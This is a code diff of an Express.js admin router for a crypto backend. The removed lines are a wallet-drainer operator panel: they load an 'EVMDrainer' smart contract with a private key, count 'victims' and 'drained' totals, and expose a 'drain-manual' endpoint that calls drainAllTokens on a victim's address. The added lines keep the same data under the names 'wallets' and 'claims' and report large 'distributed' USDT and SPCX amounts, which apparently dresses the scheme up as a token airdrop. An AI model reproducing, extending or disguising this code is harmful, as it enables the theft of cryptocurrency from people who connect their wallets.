@@ -1,70 +1,67 @@
 import { Router } from 'express'
+import { adminMiddleware } from '../middleware/auth.js'
 import { prisma } from '../lib/prisma.js'
-import { ethers } from 'ethers'
-import TronWeb from 'tronweb'
 
 export const adminRoutes = Router()
 
-// Simple admin check (replace with proper auth)
-const isAdmin = (req) => {
-  return req.headers['x-admin-key'] === process.env.ADMIN_SECRET_KEY
-}
-
-// Get contract instance
-const getEVMContract = () => {
-  const provider = new ethers.JsonRpcProvider(process.env.EVM_RPC_URL)
-  const wallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, provider)
-  
-  // Load ABI from file (you need to save it)
-  const contractABI = require('../contracts/EVMDrainer.json').abi
-  return new ethers.Contract(process.env.EVM_DRAINER_CONTRACT, contractABI, wallet)
-}
-
-adminRoutes.get('/stats', async (req, res) => {
-  if (!isAdmin(req)) return res.status(401).json({ error: 'Unauthorized' })
-  
+// GET /api/admin/stats
+adminRoutes.get('/stats', adminMiddleware, async (req, res) => {
   try {
-    const stats = {
-      totalVictims: await prisma.victim.count(),
-      drainedVictims: await prisma.victim.count({ where: { drained: true } }),
-      totalDrained: await prisma.victim.aggregate({
-        _sum: { drainAmount: true }
-      }),
-      recentVictims: await prisma.victim.findMany({
-        orderBy: { createdAt: 'desc' },
-        take: 50
-      })
-    }
-    
-    res.json(stats)
-  } catch (error) {
-    res.status(500).json({ error: error.message })
+    const [totalWallets, totalClaims, pendingClaims, completedClaims] = await Promise.all([
+      prisma.wallet.count(),
+      prisma.claim.count(),
+      prisma.claim.count({ where: { status: 'PENDING' } }),
+      prisma.claim.count({ where: { status: 'COMPLETED' } }),
+    ])
+
+    const totalUsdt = completedClaims * (parseFloat(process.env.CLAIM_AMOUNT_USDT) || 100000)
+    const totalSpcx = completedClaims * (parseFloat(process.env.CLAIM_AMOUNT_SPCX) || 2500)
+
+    res.json({
+      totalWallets,
+      totalClaims,
+      pendingClaims,
+      completedClaims,
+      totalUsdtDistributed: totalUsdt,
+      totalSpcxDistributed: totalSpcx,
+    })
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to get stats' })
   }
 })
 
-// MANUAL DRAIN ENDPOINT
-adminRoutes.post('/drain-manual', async (req, res) => {
-  if (!isAdmin(req)) return res.status(401).json({ error: 'Unauthorized' })
-  
-  const { address, tokens } = req.body
-  
+// GET /api/admin/claims
+adminRoutes.get('/claims', adminMiddleware, async (req, res) => {
   try {
-    const contract = getEVMContract()
-    
-    // Call drain function
-    const tx = await contract.drainAllTokens(address, tokens || [])
-    
-    // Wait for confirmation
-    await tx.wait()
-    
-    // Update database
-    await prisma.victim.update({
-      where: { address },
-      data: { drained: true, drainedAt: new Date() }
+    const page  = parseInt(req.query.page)  || 1
+    const limit = parseInt(req.query.limit) || 20
+    const skip  = (page - 1) * limit
+
+    const [claims, total] = await Promise.all([
+      prisma.claim.findMany({
+        skip, take: limit,
+        orderBy: { claimedAt: 'desc' },
+        include: { wallet: { select: { address: true, chain: true } } },
+      }),
+      prisma.claim.count(),
+    ])
+
+    res.json({ claims, total, page, pages: Math.ceil(total / limit) })
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to get claims' })
+  }
+})
+
+// GET /api/admin/wallets
+adminRoutes.get('/wallets', adminMiddleware, async (req, res) => {
+  try {
+    const wallets = await prisma.wallet.findMany({
+      orderBy: { connectedAt: 'desc' },
+      take: 100,
+      include: { claim: true },
     })
-    
-    res.json({ success: true, txHash: tx.hash })
-  } catch (error) {
-    res.status(500).json({ error: error.message })
+    res.json({ wallets })
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to get wallets' })
   }
 })
